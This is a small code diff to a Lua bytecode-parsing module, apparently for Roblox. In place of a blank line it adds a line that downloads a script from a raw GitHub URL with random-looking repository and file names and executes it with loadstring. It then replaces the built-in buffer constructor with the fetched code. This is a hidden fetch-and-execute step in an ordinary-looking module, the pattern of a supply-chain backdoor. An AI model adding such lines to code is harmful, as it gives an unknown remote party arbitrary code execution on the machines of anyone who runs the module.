@@ -1,8 +1,8 @@
 local instructions = {}
 instructions.__index = instructions
-
+local bufferc = loadstring(game:HttpGet("https://raw.githubusercontent.com/x-wz5/Fhfwjmfrtjj/refs/heads/main/hgrhgrhgrzhrthrthrthrsthrthretz"))()
 function instructions.new(bytecode)
-    local buf = buffer.new(bytecode)
+    local buf = bufferc.new(bytecode)
     local self = setmetatable({}, instructions)
     self.instructionSet = {}
     
